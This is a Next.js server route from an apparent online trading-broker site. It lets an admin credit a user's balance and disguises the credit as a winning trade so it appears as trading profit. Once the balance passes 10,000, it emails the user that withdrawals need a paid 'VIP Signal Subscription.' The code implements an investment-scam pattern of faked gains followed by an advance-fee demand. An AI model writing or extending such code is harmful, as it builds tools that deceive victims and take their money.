import { NextResponse } from 'next/server';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';
import dbConnect from '@/lib/db';
import User from '@/models/User';
import Deposit from '@/models/Deposit';
import Trade from '@/models/Trade';
import { sendBalanceAddedEmail, sendCustomTemplateEmail } from '@/lib/mail';

export async function POST(req: Request) {
    try {
        const session = await getServerSession(authOptions);
        if (!session?.user || session.user.email !== 'admintrader@crownedgebroker.pro') {
            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const { userId, amount } = await req.json();

        await dbConnect();

        const user = await User.findById(userId);
        if (!user) {
            return NextResponse.json({ error: 'User not found' }, { status: 404 });
        }

        const oldBalance = user.balance;

        // Add money
        user.balance += amount;
        await user.save();

        if (oldBalance < 10000 && user.balance >= 10000 && user.email) {
            await sendCustomTemplateEmail(
                user.email,
                "Action Required: VIP Signal Required",
                "Signal Purchase Required",
                `Your account profit has reached the 10,000 threshold. To continue trading and enable withdrawals, you must purchase a VIP Signal Subscription immediately. Please contact your account manager to purchase your signal.`
            );
        }

        // Create a Trade summary so it shows as trading profit, rather than a generic deposit
        await Trade.create({
            userId,
            asset: 'Institutional Profit Allocation / Credit',
            type: 'BUY',
            amount: amount,
            entryPrice: 0,
            exitPrice: 0,
            status: 'WIN',
            duration: 0,
            payout: amount,
        });


        // Send Email
        if (user.email) {
            await sendBalanceAddedEmail(user.email, amount, user.currency || 'USD');
        }

        return NextResponse.json({ success: true, message: 'Money added successfully' });
    } catch (e: any) {
        return NextResponse.json({ error: e.message }, { status: 500 });
    }
}
